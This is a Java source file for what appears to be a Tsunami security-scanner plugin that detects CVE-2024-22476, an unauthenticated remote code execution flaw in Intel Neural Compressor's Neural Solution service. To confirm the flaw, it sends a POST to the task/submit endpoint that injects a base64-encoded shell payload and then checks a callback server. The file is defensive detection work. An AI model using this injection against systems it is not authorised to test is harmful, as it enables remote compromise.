/*
 * Copyright 2024 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.google.tsunami.plugins.detectors.cves.cve202422476;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.common.net.HttpHeaders.CONTENT_TYPE;
import static com.google.tsunami.common.data.NetworkEndpointUtils.toUriAuthority;
import static com.google.tsunami.common.net.http.HttpRequest.post;
import static java.nio.charset.StandardCharsets.UTF_8;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.common.io.BaseEncoding;
import com.google.common.io.Resources;
import com.google.common.util.concurrent.Uninterruptibles;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.ForWebService;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.PayloadGeneratorConfig;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Duration;
import java.time.Instant;
import javax.inject.Inject;

/** A {@link VulnDetector} that detects the CVE-2024-22476 vulnerability. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "CVE-2024-22476 Detector",
    version = "0.1",
    description = "Checks for occurrences of CVE-2024-22476 in  Intel Neural Compressor instances.",
    author = "frkngksl",
    bootstrapModule = Cve202422476DetectorBootstrapModule.class)
@ForWebService
public final class Cve202422476VulnDetector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  private final Clock utcClock;
  private final PayloadGenerator payloadGenerator;

  private static final String VUL_PATH = "task/submit/";
  private static final Duration BATCH_REQUEST_WAIT_AFTER_TIMEOUT = Duration.ofSeconds(10);
  private final String taskRequestTemplate;
  private final HttpClient httpClient;

  @Inject
  Cve202422476VulnDetector(
      @UtcClock Clock utcClock, HttpClient httpClient, PayloadGenerator payloadGenerator)
      throws IOException {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient =
        checkNotNull(httpClient, "HttpClient cannot be null.")
            .modify()
            .setFollowRedirects(false)
            .build();
    this.payloadGenerator = checkNotNull(payloadGenerator, "PayloadGenerator cannot be null.");
    taskRequestTemplate =
        Resources.toString(Resources.getResource(this.getClass(), "task_request.json"), UTF_8);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(this::isWebServiceOrUnknownService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean checkNeuralSolutionFingerprint(NetworkService networkService) {
    String targetWebAddress = buildTarget(networkService).toString();
    var request = HttpRequest.get(targetWebAddress).withEmptyHeaders().build();

    try {
      HttpResponse response = httpClient.send(request, networkService);
      return response.status().isSuccess()
          && response
              .bodyString()
              .map(body -> body.contains("{\"message\":\"Welcome to Neural Solution!\"}"))
              .orElse(false);
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Failed to send request.");
      return false;
    }
  }

  private boolean isWebServiceOrUnknownService(NetworkService networkService) {
    return NetworkServiceUtils.isWebService(networkService)
        && checkNeuralSolutionFingerprint(networkService);
  }

  private static StringBuilder buildTarget(NetworkService networkService) {
    StringBuilder targetUrlBuilder = new StringBuilder();
    if (NetworkServiceUtils.isWebService(networkService)) {
      targetUrlBuilder.append(NetworkServiceUtils.buildWebApplicationRootUrl(networkService));
    } else {
      targetUrlBuilder
          .append("https://")
          .append(toUriAuthority(networkService.getNetworkEndpoint()))
          .append("/");
    }
    return targetUrlBuilder;
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    Payload payload = generateCallbackServerPayload();
    if (!payload.getPayloadAttributes().getUsesCallbackServer()) {
      logger.atInfo().log(
          "The Tsunami callback server is not setup for this environment, so we cannot confirm the"
              + " RCE callback");
      return false;
    }
    String taskRequestBody = taskRequestTemplate;
    // Check callback server is enabled
    logger.atInfo().log("Callback server is available!");
    taskRequestBody =
        taskRequestBody.replace(
            "{{CALLBACK_PAYLOAD}}",
            BaseEncoding.base64().encode(payload.getPayload().getBytes(UTF_8)));
    String targetVulnerabilityUrl = buildTarget(networkService).append(VUL_PATH).toString();
    logger.atInfo().log("Payload: %s", payload.getPayload().getBytes(UTF_8));
    try {
      HttpResponse httpResponse =
          httpClient.send(
              post(targetVulnerabilityUrl)
                  .setHeaders(
                      HttpHeaders.builder().addHeader(CONTENT_TYPE, "application/json").build())
                  .setRequestBody(ByteString.copyFromUtf8(taskRequestBody))
                  .build(),
              networkService);
      logger.atInfo().log("Callback Server Payload Response: %s", httpResponse.bodyString().get());
      Uninterruptibles.sleepUninterruptibly(BATCH_REQUEST_WAIT_AFTER_TIMEOUT);
      return payload.checkIfExecuted();

    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Failed to send request.");
      return false;
    }
  }

  private Payload generateCallbackServerPayload() {
    PayloadGeneratorConfig config =
        PayloadGeneratorConfig.newBuilder()
            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.BLIND_RCE)
            .setInterpretationEnvironment(
                PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
            .setExecutionEnvironment(
                PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
            .build();

    return this.payloadGenerator.generate(config);
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("CVE_2024_22476"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("CVE-2024-22476 Intel Neural Compressor RCE")
                .setDescription(
                    "The Intel Neural Compressor has a component called Neural Solution that brings"
                        + " the capabilities of Intel Neural Compressor as a service. The"
                        + " task/submit API in the Neural Solution webserver is vulnerable to an"
                        + " unauthenticated remote code execution (RCE) attack. The"
                        + " script_urlparameter in the body of the POST request for this API is not"
                        + " validated or filtered on the backend. As a result, attackers can"
                        + " manipulate this parameter to remotely execute arbitrary commands.")
                .setRecommendation(
                    "You can upgrade your Intel Neural Compressor instances to 2.5.0 or later."))
        .build();
  }
}
